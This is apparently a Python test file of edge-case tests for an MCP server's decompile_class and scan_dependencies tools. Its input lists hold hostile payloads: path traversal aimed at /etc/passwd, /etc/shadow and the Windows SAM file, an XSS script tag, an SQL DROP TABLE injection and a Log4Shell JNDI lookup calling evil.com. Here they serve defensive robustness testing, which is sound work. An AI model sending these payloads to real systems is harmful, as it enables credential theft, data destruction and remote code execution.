"""
Edge Cases - Boundary Conditions and Unusual Inputs

These tests verify the server handles unusual inputs gracefully.
"""

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "client"))
from mcp_test_client import MCPClient, with_project


async def test_empty_class_name(client: MCPClient) -> None:
    """Test handling of empty class name"""
    result = await client.call_tool("decompile_class", {
        "className": "",
        "projectPath": "/tmp"
    })
    # Should handle gracefully
    assert "result" in result or "error" in result


async def test_special_characters_in_class_name(client: MCPClient) -> None:
    """Test handling of special characters in class name"""
    special_names = [
        "../../etc/passwd",
        "<script>alert('xss')</script>",
        "../../../",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com/a}",
    ]

    for name in special_names:
        result = await client.call_tool("decompile_class", {
            "className": name,
            "projectPath": "/tmp"
        })
        # Should not crash, should handle gracefully
        assert "result" in result or "error" in result


async def test_very_long_class_name(client: MCPClient) -> None:
    """Test handling of very long class name"""
    long_name = "com." + "very." * 100 + "long.ClassName"

    result = await client.call_tool("decompile_class", {
        "className": long_name,
        "projectPath": "/tmp"
    })
    # Should handle gracefully
    assert "result" in result or "error" in result


async def test_null_project_path(client: MCPClient) -> None:
    """Test handling of null/empty project path"""
    result = await client.call_tool("scan_dependencies", {
        "projectPath": ""
    })
    # Should handle gracefully
    assert "result" in result or "error" in result


async def test_unicode_in_paths(client: MCPClient) -> None:
    """Test handling of unicode characters in paths"""
    result = await client.call_tool("decompile_class", {
        "className": "com.测试.Test",
        "projectPath": "/tmp/测试"
    })
    # Should handle gracefully
    assert "result" in result or "error" in result


async def test_missing_required_params(client: MCPClient) -> None:
    """Test handling of missing required parameters"""
    # Missing className
    result = await client.call_tool("decompile_class", {
        "projectPath": "/tmp"
    })
    # Should indicate missing parameter
    assert "result" in result or "error" in result


async def test_extra_parameters(client: MCPClient) -> None:
    """Test handling of extra unknown parameters"""
    result = await client.call_tool("decompile_class", {
        "className": "com.test.Test",
        "projectPath": "/tmp",
        "unknownParam": "value",
        "anotherUnknown": 123
    })
    # Should ignore extra params
    assert "result" in result or "error" in result


async def test_invalid_json_types(client: MCPClient) -> None:
    """Test handling of wrong data types"""
    # className as number instead of string
    result = await client.call_tool("decompile_class", {
        "className": 12345,
        "projectPath": "/tmp"
    })
    # Should handle type error gracefully
    assert "result" in result or "error" in result


async def test_non_existent_jar_reference(client: MCPClient, project_root: Path) -> None:
    """Test handling of reference to non-existent JAR"""
    result = await client.call_tool("decompile_class", {
        "className": "com.nonexist.FakeClass",
        "projectPath": str(project_root)
    })
    # Should indicate class not found
    assert "result" in result or "error" in result


async def test_path_traversal_attempts(client: MCPClient) -> None:
    """Test protection against path traversal attacks"""
    traversal_attempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
    ]

    for path in traversal_attempts:
        result = await client.call_tool("scan_dependencies", {
            "projectPath": path
        })
        # Should not expose sensitive data
        assert "result" in result or "error" in result


EDGE_CASE_TESTS = [
    test_empty_class_name,
    test_special_characters_in_class_name,
    test_very_long_class_name,
    test_null_project_path,
    test_unicode_in_paths,
    test_missing_required_params,
    test_extra_parameters,
    test_invalid_json_types,
    test_non_existent_jar_reference,
    test_path_traversal_attempts,
]
